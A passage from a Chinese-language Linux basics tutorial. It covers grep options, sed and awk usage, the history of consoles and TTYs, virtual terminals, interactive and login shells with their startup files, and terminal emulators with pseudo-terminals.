| ------ | -------------------------------- |
| -i     | 忽略大小写                       |
| -r     | 递归搜索目录下所有文件           |
| -n     | 输出时带上行号                   |
| -v     | 反向匹配：输出不包含该模式的行   |
| -o     | 只打印匹配到的文本，而不是整行   |
| -E     | 使用扩展正则，不用转义 `()+      |
| -F     | 把搜索内容当成纯文本，不解析正则 |
| -c     | 只输出匹配行数，不输出内容       |
| -A N   | 匹配行之后，再多输出 N 行        |
| -B N   | 匹配行之前，再多输出 N 行        |
| -C N   | 前后各输出 N 行（上下文）        |
| -q     | 静默，只返回退出码，脚本判断用   |

## sed

sed 编辑器被称作流编辑器（stream editor），在交互 式文本编辑器（比如Vim）中，可以用键盘命令交互式地插入、删除或替换文本数据。流编辑器 则是根据事先设计好的一组规则编辑数据流。他的执行过程如下：

1. 从输入中读取一行数据。
2. 根据规则匹配（修改）数据。  
3. 将新的数据输出到STDOUT。

在流编辑器匹配并针对一行数据执行所有规则之后，会读取下一行数据并重复这个过程。在 流编辑器处理完数据流中的所有行后，就结束运行。

看一个下面的简单文本替换的例子：

```bash
# 把 root 替换成 admin，每行只换第一个
$echo "root root" | sed 's/root/admin/'

# 全局替换（g）
$echo "root root" | sed 's/root/admin/g'

# 忽略大小写
$echo "Root ROOT" | sed 's/root/test/gi'

```

删除行：

```bash
# 删除包含 root 的行
$sed '/root/d' demo.txt

# 删除注释行（#开头）
$sed '/^#/d' sshd_config

# 删除空行
$sed '/^$/d' demo.txt
```

插入数据：

```bash
# 匹配到 admin，在这一行后面追加一行
$sed '/admin/a new_line' demo.txt

# 在匹配行前面插入
$sed '/admin/i before_line' demo.txt
```

## awk

`awk` 命令是一种专为文本处理设计的编程语言，通常被用作数据提取和报告工具。它的功能和sed一样异常强大，两个常用的功能是作为字段分隔符的 `-F` 选项，以及用于输出结果文本的 `print` 子命令，它会将文本打印到STDOUT，

在读取一行文本时，awk 会用预先定义 好的字段分隔符划分出各个数据字段。在默认情况下，字段分隔符是任意的空白字符（比如空格 或制表符）。 这些数据字段分配一 个内置变量。在默认情况下，gawk会将下列变量分配给文本行中的数据字段：

1. $0代表整个文本行。   
2. $1代表文本行中的第一个数据字段。  
3. $2代表文本行中的第二个数据字段。   
4. $n代表文本行中的第n个数据字段。

```bash
$ echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
hello friend
```

这里使用“::”作为字段分隔符来提取第一个（$1）和第三个（$3）字段，并输出。

## 历史演进

早期计算机往往体积庞大、价格昂贵，通常由专门的操作人员负责管理。为了让操作人员能够控制计算机的运行，计算机配备了专门的操作面板，也就是控制台（Console）。

早期控制台通常由开关、按钮和指示灯组成。操作人员可以通过开关输入数据或控制指令，通过指示灯观察计算机的运行状态。在一些计算机中，操作人员还可以借助控制台检查或修改寄存器和内存中的内容。这种交互方式十分有限。计算机内部的信息需要通过指示灯等方式表示，操作人员则需要借助开关完成操作。控制台主要用于计算机的启动、维护、调试和运行控制，而不是让大量普通用户直接使用计算机。

随着计算机技术的发展，操作系统开始支持多任务和多用户。计算机不再只是由一名操作人员管理并依次执行任务，而是可以为多个用户提供计算服务。然而，传统控制台并不适合这种使用方式。一方面，控制台通常直接连接计算机，主要用于系统管理；另一方面，多个用户不可能同时通过同一组开关和指示灯独立操作计算机。

因此，计算机需要一种能够供用户独立输入和接收信息的交互设备。为了让多个工程师同时使用这台主机，人们通过长长的串口线（RS-232），将多台电传打字机（Teletypewriter，简称 TTY）连接到主机上。电传打字机只有键盘和打印纸，没有 CPU 和内存。敲击按键时，它通过串口线向主机发送电信号（ASCII 编码）；收到主机信号时，驱动字锤在纸上打印字符。后来打印纸被 CRT 显像管屏幕取代（最著名的代表是 DEC VT100）。这种用于人与计算机进行交互的设备，后来被称为终端（Terminal）。

![console](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/console.webp)

终端并不负责理解用户输入的命令，也不负责执行程序。它主要提供输入和输出能力：用户通过终端输入字符，计算机通过终端返回信息。

不同厂商生产的终端还可能采用不同的通信方式、控制字符和显示能力。虽然这些设备在硬件和功能上存在差异，但对于运行在计算机上的大多数程序而言，它们承担着相同的基本任务：接收用户输入，并向用户输出信息。因此，操作系统需要将具体的终端硬件与应用程序使用的交互接口分离。Unix 为此建立了统一的终端设备处理机制。由于早期广泛使用的终端设备是电传打字机，这套机制沿用了 Teletype 的名称，简称 **TTY**。TTY 最初是电传打字机的缩写，但在 Unix 及 Linux 中，其含义已经扩展为操作系统中的终端设备及相关处理机制。这意味着，应用程序不需要直接了解终端的硬件结构，而是可以通过操作系统提供的接口进行终端输入和输出。

然而，随着个人计算机的普及，这种使用方式逐渐发生了变化。个人计算机通常直接配备键盘和显示器，用户不再需要额外连接一台独立的终端设备。与此同时，操作系统仍然需要保留终端交互能力，使用户能够登录系统、输入命令并运行程序。

## 虚拟终端

既然已经有了键盘和显示器，能否直接利用这些设备提供传统终端的功能？Linux 通过**虚拟终端（Virtual Terminal，VT）**机制实现了这一需求。

虚拟终端并不是一台真实存在的独立设备，而是由操作系统通过软件提供的终端环境。在采用 Linux 虚拟控制台机制的系统中，内核可以利用本地键盘和显示设备提供多个相互独立的字符终端。例如，Linux 通常提供以下虚拟终端设备,通常以**字符设备文件（Character Device File）**的形式出现在 /dev 目录下：

```text
/dev/tty1     第一个虚拟终端
/dev/tty2     第二个虚拟终端
/dev/ttyS0
/dev/console 
...
```

每个虚拟终端都可以拥有独立的登录会话和正在运行的程序。用户可以在其中一个终端登录系统、执行命令，再切换到另一个终端进行其他操作，而不必额外连接多台物理终端。

在传统的 Linux 虚拟控制台环境中，可以通过 Ctrl + Alt + F1、Ctrl + Alt + F2 等组合键切换不同的虚拟终端。实际使用的按键及终端编号取决于发行版和系统配置。例如，在没有图形桌面的 Linux 系统中，启动完成后可能会显示：

```text
Ubuntu 24.04 LTS tty1

login:
```

这里的 **tty1** 表示当前使用的是第一个虚拟终端。用户登录后，系统通常会启动一个 Shell，供用户输入和执行命令。

尽管虚拟终端不再依赖独立的终端硬件，但它仍然保留了传统终端的基本交互方式：接收用户输入，并显示程序输出。因此，从早期通过串口连接的物理终端，到个人计算机上的虚拟终端，改变的是终端的实现方式，而不是程序所依赖的基本终端接口。

还有两个比较特殊的设备文件，

-  /dev/ttyS0：通常对应一个传统串口设备，可以通过串行通信接口与外部终端进行数据交换。
- /dev/console ：这个特殊的设备节点它代表“当前被内核指定的最高权限系统控制台”。通过配置内核启动参数（Kernel Command Line），管理员可以灵活指定谁来当 Console。默认 console=tty0。因此开机时你能在显示器上看到一串串 [  OK  ] Started ... 的内核启动日志。机房里的机架式服务器和路由器通常不插显示器。工程师会在内核参数中配置 console=ttyS0,115200。此时，内核把物理串口 /dev/ttyS0 设置为 System Consol。！运维人员拿一根串口线插到服务器上（或者通过服务器主板上的 BMC/IPMI 带外管理芯片模拟串口），就能在自己的笔记本上看到服务器开机 BIOS 和内核崩溃日志——这就是为什么在云服务器（如 AWS、阿里云）后台，那个用于救急的“VNC 救援连接/串口日志”被称为 Serial Console（串口控制台）。

这些设备文件虽然名称相似，但背后对应的终端实现并不相同。对于应用程序而言，这些差异通常不需要直接考虑。程序可以使用 open() 打开设备，再通过 read() 和 write() 等系统调用读取输入或写入输出。例如，一个程序需要从终端读取用户输入时，并不需要了解字符究竟来自串口设备，还是来自本地键盘。它只需要通过已经打开的终端设备接口读取数据。

## TTY子系统

之所以能够做到这一点，是因为 Linux 内核提供了 TTY 子系统，用于协调终端设备的输入输出处理。

![TTY](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/TTY.webp)



这里的 TTY 子系统并不只是简单地转发数据。它还提供终端输入缓冲、字符回显、终端属性管理以及特殊控制字符处理等功能。而设备驱动及相关实现负责处理具体设备的输入输出。

可以通过以下命令观察终端设备：

```bash
ls -l /dev/tty1 /dev/ttyS0
```

在存在这些设备节点的系统中，可能看到类似输出：

```text
crw--w---- 1 root tty     4, 1 ... /dev/tty1
crw-rw---- 1 root dialout 4,64 ... /dev/ttyS0
```

其中的 4, 1 和 4,64 分别表示设备的主设备号（Major Number）和次设备号（Minor Number），用于帮助内核识别设备及其对应的驱动接口。

## Shell执行命令流程

前面已经介绍，TTY 为程序提供了统一的终端输入输出接口。用户可以通过终端向计算机发送字符，计算机也能够通过终端将结果返回给用户。

然而，终端和 TTY 只解决了输入输出的问题，并不能直接理解用户输入的命令。

例如，当用户输入：

```bash
ls -l
```

对于终端而言，这只是一串普通字符。TTY 可以接收并传递这些字符，但它并不知道 ls 表示列出目录内容，也不知道 -l 是传递给程序的命令选项。

Linux 内核虽然负责进程管理、内存管理、文件系统和设备管理等工作，但并不直接将用户输入的文本解释为命令。内核提供的是系统调用等底层接口，应用程序需要通过这些接口请求内核完成相应操作。

如果要求用户直接使用这些底层接口操作计算机，不仅十分复杂，也不适合日常使用。因此，Unix 需要一个运行在用户空间的程序，专门负责接收用户输入、解释命令，并调用相应的程序或系统功能。

这个程序就是 **Shell（命令解释器）**。

Shell 的主要职责是读取命令、解析命令，并根据命令的内容执行相应操作。

在 Unix 早期，Shell 就已经是用户与操作系统交互的重要组成部分。随着 Unix 的发展，出现了多种不同的 Shell，例如 Bourne Shell（sh）、C Shell（csh）和 Korn Shell（ksh）。Linux 系统中常见的 Shell 则包括 Bash、Zsh、Fish 和 Dash。

虽然它们在语法、交互功能和脚本兼容性方面存在差异，但都承担着命令解释和执行的基本职责。

需要注意，Shell 并不是终端设备的一部分，也不是 Linux 内核的一部分。它是一个普通的用户空间程序，只是通常通过终端与用户交互。简化的数据流如下所示：

- 输入：用户 → 终端 → 内核 TTY → Shell
- 输出：Shell → 内核 TTY → 终端 → 用户

既然 Shell 负责解释用户输入的命令，那么它在接收到一条命令后，究竟会进行哪些操作？

当用户输入命令按下 Enter 后，Shell 从终端读取这一行输入，并按照 Shell 的语法规则进行解析。

对于外部命令，Shell 会查找对应的可执行程序。在没有显式指定路径的情况下，Shell 通常会根据 **PATH 环境变量**中的目录查找程序。对于内部命令，通常由shell自己执行。

在 Linux 中，程序运行在进程（Process）中。Shell 本身也是一个进程，因此，当它需要运行外部命令时，通常会创建子进程，再让子进程执行目标程序。

当 Shell 在终端中运行时，它的标准输入、标准输出和标准错误通常都连接到当前终端设备：

```txt
			  终端设备
                 |
       +---------+---------+
       |         |         |
       v         ^         ^
     stdin     stdout    stderr
       |         |         |
       +---------+---------+
                 |
                Shell
```

Shell 通过标准输入读取用户输入的命令，通过标准输出显示正常结果，通过标准错误输出错误信息。

当 Shell 启动一个外部程序时，该程序通常会继承 Shell 已经打开的标准文件描述符，除非 Shell 根据命令要求修改这些连接——这就是 Linux 重定向机制的基础。

## Shell 的不同运行方式

到目前为止，我们主要讨论通过终端与 Shell 进行交互的情况。但 Shell 并不是只能通过终端运行，也不一定每次启动都需要完成相同的初始化工作。

例如，用户登录 Linux 系统后，通常需要获得相应的运行环境，包括环境变量、命令搜索路径以及其他用户配置。而当用户只是执行一个 Shell 脚本时，通常不需要重新初始化完整的登录环境。

此外，Shell 有时需要持续接收用户输入，有时则只需要执行一段预先写好的命令。

为了适应这些不同的使用场景，Shell 具有不同的运行方式。这里需要从两个相互独立的角度进行区分：

- **交互式 Shell 与非交互式 Shell**：区分 Shell 是否以交互模式运行。
- **登录 Shell 与非登录 Shell**：区分 Shell 是否以登录模式启动，主要影响启动时的初始化行为。

需要注意，这两种分类并不互相排斥。一个 Shell 可以同时属于其中两个类别。

###  交互式 Shell 与非交互式 Shell

当用户打开一个命令行环境，看到命令提示符，并能够不断输入命令时，通常使用的是交互式 Shell（Interactive Shell）。

交互式 Shell 会持续读取用户输入，并提供适合人工操作的功能，例如命令提示符、命令历史和作业控制等。

例如，直接在终端中启动 Bash：

```bash
$bash
```

在标准输入和标准错误均连接终端、且没有指定脚本或 `-c` 命令的通常情况下，Bash 会进入交互模式。

用户可以输入命令，查看执行结果，然后继续输入下一条命令。

但 Shell 并不一定需要等待用户输入。例如，将以下内容保存为 `script.sh`：

```bash
#!/bin/bash

echo "Starting..."
date
echo "Finished."
```

然后执行：

```bash
bash script.sh
```

此时，Bash 直接读取脚本文件中的命令，执行完成后退出。这通常属于非交互式 Shell（Non-interactive Shell）。非交互式 Shell 常见于脚本执行、定时任务和自动化操作。

因此，交互式与非交互式的主要区别，不是 Shell 是否能够执行命令，而是它是否以交互模式运行。

在 Bash 中，可以通过特殊变量 `$-` 查看当前 Shell 启用的选项：

```bash
echo "$-"
```

如果输出包含 `i`，表示当前 Bash 处于交互模式。还可以使用：

```bash
[[ $- == *i* ]] && echo "Interactive" || echo "Non-interactive"
```

判断当前 Bash 是否为交互式 Shell。

需要注意，是否连接 TTY 并不能作为判断交互式 Shell 的唯一依据。Bash 可以使用 `-i` 显式启用交互模式，也可以在终端中执行非交互式脚本。

### 登录 Shell 与非登录 Shell

除了交互方式，Shell 还需要区分是否以登录模式启动。

早期 Unix 用户通常先通过终端登录系统。登录程序在完成用户身份验证后，会启动用户对应的 Shell，并使其获得必要的初始化环境。

但随着系统的发展，Shell 不再只在用户登录时启动。

例如，用户可以在已经运行的 Shell 中再启动一个新的 Bash，也可以通过图形终端模拟器启动 Shell，或者通过脚本执行程序。

这些启动方式不一定需要重新执行登录初始化。

因此，Shell 区分登录 Shell（Login Shell）与非登录 Shell（Non-login Shell）。

**登录 Shell** 是以登录模式启动的 Shell。它通常用于建立用户登录后的命令行环境，并在启动时读取相应的登录初始化文件。

**非登录 Shell** 则没有以登录模式启动，通常不会按照登录 Shell 的规则读取登录初始化文件。

需要特别注意，登录 Shell 并不意味着该 Shell 自己执行了身份验证，也不意味着每次启动登录 Shell 都需要重新输入用户名和密码。

登录与非登录在这里描述的是 Shell 的启动模式，而不是用户此刻是否已经登录操作系统。

例如，用户在 Linux 虚拟控制台完成登录后，登录程序通常会启动一个登录 Shell。

而用户进入 Bash 后，再执行：

```bash
bash
```

通常会启动一个新的非登录 Shell。

如果希望显式启动登录 Shell，可以执行：

```bash
bash --login
```

或者：

```bash
bash -l
```

因此，即使用户已经登录系统，也可以在同一个登录会话中启动非登录 Shell，或者手动启动另一个登录 Shell。

在 Bash 中，可以使用以下命令判断当前 Shell 是否以登录模式启动：

```bash
shopt -q login_shell && echo "Login Shell" || echo "Non-login Shell"
```

这里的 login_shell 是 Bash 提供的一个只读 Shell 选项，用于标识当前 Bash 是否为登录 Shell。

登录 Shell 与非登录 Shell 的一个重要区别，是它们启动时读取的初始化文件不同。

用户的命令行环境往往需要进行一定配置，例如设置环境变量、定义命令别名或者调整命令搜索路径。

为了避免每次启动 Shell 都手动输入这些配置，Shell 可以在启动时读取特定的初始化文件。

以 Linux 中常见的 Bash 为例，不同启动模式对应不同的初始化规则。

交互式登录 Bash 通常会读取 /etc/profile 文件，然后依次查找以下用户配置文件，并读取找到的第一个：

```text
~/.bash_profile
~/.bash_login
~/.profile
```

交互式非登录 Bash 通常会读取：

```text
~/.bashrc
```

在许多 Linux 发行版中，用户的登录配置文件还会主动加载 ~/.bashrc 文件，因此登录 Shell 也可能执行其中的配置。

但这种加载关系是由配置文件的内容决定的，而不是 Bash 必然自动读取全部这些文件。

非交互式 Bash 默认不会按照交互式 Shell 的规则读取 ~/.bashrc，但可能受到 BASH_ENV 等机制影响。

此外，以 sh 名称启动 Bash、启用 POSIX 模式，或者发行版额外配置全局初始化文件时，实际行为可能有所不同。因此，这里的规则针对以 bash 名称正常启动的常见 Bash 环境。

可以将常见情况归纳如下：

| Bash 运行方式  | 登录模式 | 常见启动文件                                                 |
| -------------- | -------- | ------------------------------------------------------------ |
| 交互式登录     | 是       | /etc/profile 和用户登录配置文件                              |
| 交互式非登录   | 否       | ~/.bashrc                                                    |
| 非交互式登录   | 是       | 登录初始化文件，另受非交互式规则影响                         |
| 非交互式非登录 | 否       | 默认不读取上述交互式配置文件，可能读取 `BASH_ENV` 指定的文件 |

这里不需要立即记住所有配置文件。现阶段最重要的是理解：Shell 在不同启动方式下，可以使用不同的初始化规则，因此同一用户在不同环境中启动 Bash，得到的命令别名、环境变量等配置可能存在差异。

可以在 Bash 中使用以下两条命令分别查看当前状态：

```bash
# 判断是否为交互式 Shell
[[ $- == *i* ]] && echo "Interactive" || echo "Non-interactive"

# 判断是否为登录 Shell
shopt -q login_shell && echo "Login Shell" || echo "Non-login Shell"
```

通过这两条命令，可以分别观察 Shell 的交互模式和登录模式，而不必根据是否打开终端窗口来猜测。

## 终端模拟器和伪终端

前面已经介绍，早期 Unix 系统通过物理终端与用户交互。随着个人计算机的发展，Linux 又通过虚拟终端机制，使用户能够直接利用本地键盘和显示器使用命令行环境。

然而，无论是物理终端还是 Linux 虚拟终端，它们主要提供的都是字符交互环境。用户通常需要在相应的终端界面中输入命令，而不能像现代图形桌面一样，将命令行与其他图形应用程序放在不同窗口中同时操作。

随着图形用户界面（Graphical User Interface，GUI）的发展，用户开始通过窗口管理器和图形应用程序操作计算机。文本编辑器、文件管理器、浏览器等程序可以同时运行，并在各自的窗口中与用户交互。

尽管图形界面提供了更加直观的操作方式，命令行仍然是系统管理、软件开发和自动化操作的重要工具。

因此，人们希望能够直接在图形桌面中使用命令行，而不必切换到独立的字符终端。

为此，出现了**终端模拟器（Terminal Emulator）**。

终端模拟器是一种模拟传统终端行为的程序。它接收用户的键盘输入，并在窗口中显示字符，使运行在其中的程序能够按照传统终端的交互方式工作。

常见的终端模拟器包括：

- XTerm
- GNOME Terminal
- Konsole
- Alacritty

需要注意，终端模拟器并不是随着现代 Linux 桌面才出现的。早在图形桌面普及之前，人们就已经使用软件模拟不同类型的硬件终端。现代图形终端模拟器延续了这一技术思路。

与传统物理终端不同，图形终端模拟器通常不需要专门的终端硬件。它本身就是运行在用户空间的应用程序，依靠图形系统完成窗口绘制和键盘事件处理。

但终端模拟器不仅仅是一个能够输入和显示文字的窗口。

传统终端除了接收和输出普通字符，还支持一系列用于控制显示行为的操作。例如，程序可以要求终端移动光标、清除屏幕、修改字符颜色，或者在指定位置重新绘制内容。

这些操作通常通过终端控制序列实现。

例如，许多现代终端模拟器支持 ANSI/ECMA-48 风格的控制序列，程序可以通过输出特定字节序列控制终端显示效果。

这也解释了为什么 `vim`、`top` 等程序能够在终端中不断更新屏幕内容，而不是只能一行接一行地输出文字。

终端模拟器负责解释这些控制序列，并将其转换为实际的显示操作。

因此，它与 Shell 的职责完全不同：

- 终端模拟器负责提供终端交互界面、解释终端控制序列和显示输出。
- Shell 负责读取用户命令、解析命令并执行相应操作。

例如，用户通过终端模拟器输入 `ls`，终端模拟器并不知道 `ls` 的含义，也不会自行执行这个命令。它只负责将输入传递给相应的程序，并显示程序返回的内容。

伪终端（PTY）并不是一种真实的终端硬件，而是操作系统通过软件实现的终端设备机制。PTY 的概念早已存在于 Unix 系统中，并不专门服务于图形终端模拟器。除了本地终端窗口，它还广泛应用于远程登录、终端复用以及其他需要模拟终端环境的程序。伪终端的核心设计，是创建一对相互关联的设备接口：

- **PTY Master（主设备）**
- **PTY Slave（从设备）**

其中，PTY Slave 向应用程序提供普通的终端设备接口。

Shell 可以像使用物理终端或 Linux 虚拟终端一样使用 PTY Slave，通过它读取输入、输出数据，并调用终端控制接口。

而 PTY Master 则由负责管理交互的程序持有，例如终端模拟器。终端模拟器可以向 Master 写入数据，也可以通过 Master 读取 Slave 一侧产生的输出。两者通过 Linux 内核中的 PTY 机制相互连接。数据流转的流程如下：

- 键盘输入：终端模拟器 → write → PTY Master →【内核】→ PTY Slave → Shell
- 输出文字：Shell → write → PTY Slave →【内核】→ PTY Master → 终端模拟器 → 渲染到屏幕

这里需要注意，Master 和 Slave 虽然成对出现，但它们承担的职责并不相同。

PTY Slave 具有终端设备的语义，能够使用 TTY 子系统提供的线路规程、终端属性和作业控制等机制。

PTY Master 则主要提供一种让终端模拟器等程序与该终端交换数据的接口。

当终端模拟器向 Master 写入数据时，这些数据会进入 Slave 一侧的终端输入处理路径，经过相应处理后供 Shell 读取。反过来，当 Shell 或其启动的程序向 Slave 写入输出时，终端模拟器便可以从 Master 读取对应的数据。

这意味着，终端模拟器并不需要直接操作 Shell 的内部状态，Shell 也不需要知道对面是否存在真实的终端硬件。对于 Shell 来说，它面对的依然是一个 TTY 设备。

这正是 PTY 的重要意义：**将终端的输入输出界面与底层硬件解耦，使普通软件也能够提供完整的终端交互环境。**

在现代 Linux 中，通常使用 Unix 98 风格的伪终端机制。Linux 提供了一个特殊的设备节点：

```text
/dev/ptmx
```

程序可以通过打开 `/dev/ptmx` 创建新的伪终端实例，并获得对应的 PTY Master 文件描述符。随后，程序可以通过相关接口完成 Slave 的授权、解锁和定位。新创建的 PTY Slave 通常会出现在：

```text
/dev/pts/
```

例如：

```text
/dev/pts/0
/dev/pts/1
/dev/pts/2
```

这些设备节点通常由 devpts 文件系统管理。需要注意，/dev/ptmx 并不是某一个固定的 PTY Master，而是创建或获取新伪终端主设备的入口。打开它所获得的文件描述符，对应一个具体的伪终端实例。

例如，当终端模拟器创建一个新的 PTY 时，内核可能为其分配 /dev/pts/0 作为从设备。如果再创建一个新的 PTY，则可能得到 /dev/pts/1。这些编号由系统分配，并不固定，也不代表特定的用户或 Shell。

创建好 PTY 后，终端模拟器还需要启动 Shell，并让 Shell 的标准输入、标准输出和标准错误连接到 PTY Slave。对于需要控制终端的交互式会话，还需要完成相应的会话和控制终端设置。这些操作通常由终端模拟器或负责启动 Shell 的辅助进程完成，具体实现可能因程序而异。

理解终端模拟器与 PTY 的工作方式后，可以通过一些简单的命令观察当前系统中的终端设备。

**查看当前终端设备**

```bash
$tty
```

在终端模拟器中，通常会得到：

```text
/dev/pts/0
```

这说明当前标准输入关联到了一个伪终端从设备。

**查看 PTY 设备节点**

```bash
$ls -l /dev/pts/
```

可以查看当前 devpts 文件系统中的伪终端从设备节点。

**查看 Shell 的标准文件描述符**

```bash
$ls -l /proc/$$/fd/
```

在普通交互式 Bash 中，可能看到：

```text
0 -> /dev/pts/0
1 -> /dev/pts/0
2 -> /dev/pts/0
```

这说明当前 Shell 的标准输入、标准输出和标准错误都连接到同一个 PTY Slave。

**查看终端窗口大小**

```bash
$stty size
```

可能输出：

```text
24 80
```

其中，24 表示终端行数，80 表示终端列数。

尝试调整终端窗口大小，再次执行该命令，可以观察窗口尺寸的变化。

**查看终端属性**

```bash
$stty -a
```

该命令可以查看当前终端的输入模式、回显设置、控制字符及其他属性。

通过这些命令，可以从用户空间观察 Linux 终端设备的部分运行状态。
